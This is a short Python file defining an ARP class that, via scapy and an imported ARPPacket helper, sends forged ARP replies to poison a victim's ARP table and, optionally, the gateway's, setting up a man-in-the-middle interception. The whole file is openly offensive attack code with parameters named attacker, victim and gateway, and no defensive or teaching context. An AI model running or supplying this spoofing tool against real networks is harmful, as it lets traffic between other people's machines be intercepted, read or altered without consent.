#!/usr/bin/env python
from classes.ARPPacket import ARPPacket
from scapy.all import *

class ARP:
    def __init__(self, attacker, victim, gateway, interface = "enp0s3"):
        self.attacker = attacker
        self.victim = victim
        self.gateway = gateway
        self.interface = interface


    def spoof(self, mitm = False):
        victim_packet = ARPPacket(
            self.attacker,
            self.victim,
            self.gateway,
            self.interface
        )
        victim_packet.send()
        print("Poisoned victim's ARP table")
        
        if (mitm):
            gateway_packet = ARPPacket(
                self.attacker,
                self.gateway,
                self.victim,
                self.interface
            )
            gateway_packet.send()
            print("Poisoned Gateway's ARP table")
